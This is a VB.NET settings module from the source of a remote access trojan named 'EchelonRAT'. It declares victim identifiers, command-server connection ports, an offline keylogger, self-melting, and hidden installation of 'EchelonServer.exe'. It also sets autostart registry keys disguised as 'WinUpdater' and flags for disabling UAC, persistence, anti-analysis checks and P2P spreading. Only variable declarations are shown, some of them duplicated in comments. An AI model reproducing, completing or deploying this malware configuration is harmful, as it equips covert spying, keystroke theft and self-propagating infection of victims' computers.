Module Module2
    ' Informationen!!!

    Public Structure VerbindungsInformationen
        Dim IpAdresse As String
        Dim ConnectPort As Integer
        Dim TransferPort As Integer
    End Structure
    
    Public VerbindungsDaten As New List(Of VerbindungsInformationen)
    Public VictimName As String = "blaaa"
    Public OffKeylogger As Boolean = True
    Public ReconnectTime As Integer = 1000
    Public Passwort As String = "Admin"

    Public ErrorMessage As Boolean = False
    Public ErrorMessageTitel As String = "Titel"
    Public ErrorMessageText As String = "Teeeeeeeeeeeeeeeext"
    Public ErrorMessageStyle As String = "ex"
    Public SystemProzessSetzen As Boolean = False

    Public InstallationsOrdner As String = "C:\"
    Public ServerInstallationsPfad As String
    Public UnterOrdnerName As String = "EchelonRAT"
    Public UnterOrdnerErstellen As Boolean = True
    Public DateiName As String = "EchelonServer.exe"


    Public Melt As Boolean = False
    Public Attribut_Versteckt As Boolean = False
    Public ServerInstallieren As Boolean = False
    Public MutexString As String = "sdfdfg456"

    Public Autostart_CurrentUser As Boolean = False
    Public Autostart_LocalMashine As Boolean = False
    Public Autostart_AxtivX As Boolean = False
    Public AutostartKey_CurrentUser As String = "WinUpdater"
    Public AutostartKey_LocalMashine As String = "WinUpdater"
    Public AutostartKey_AxtivX As String = "WinUpdater"

    Public UAC_Deaktivieren As Boolean = False
    Public Persistenz As Boolean = False
    Public DDebug As Boolean = True

    Public Antis As Boolean = False
    Public P2PSpread As Boolean = True






    'Public VerbindungsDaten As New List(Of VerbindungsInformationen)
    'Public AntiFunktionen As Boolean = False
    'Public IPAdresse As String
    'Public Port As Integer
    'Public TransferPort As Integer
    'Public VictimName As String
    'Public OffKeylogger As Boolean
    'Public ReconnectTime As Integer
    'Public Passwort As String

    'Public ErrorMessage As Boolean
    'Public ErrorMessageTitel As String
    'Public ErrorMessageText As String
    'Public ErrorMessageStyle As String
    'Public SystemProzessSetzen As Boolean
    'Public InstallationsOrdner As String
    'Public Melt As Boolean
    'Public Attribut_Versteckt As Boolean
    'Public Attribut_ReadOnly As Boolean
    'Public Attribut_System As Boolean
    'Public ServerInstallieren As Boolean
    'Public MutexString As String

    'Public Autostart_CurrentUser As Boolean
    'Public Autostart_LocalMashine As Boolean
    'Public Autostart_AxtivX As Boolean
    'Public AutostartKey_CurrentUser As String
    'Public AutostartKey_LocalMashine As String
    'Public AutostartKey_AxtivX As String


    'Public UAC_Deaktivieren As Boolean
    'Public Persistenz As Boolean

    'Public DDebug As Boolean = False
    'Public Antis As Boolean
    'Public P2PSpread As Boolean




    '#############################
    Public VictimID As String
    Public ServerVersion As String = "0.4"
    Public _Ipadresse As String
    Public _ConnectionPort As Integer
    Public _TransferPort As Integer
End Module
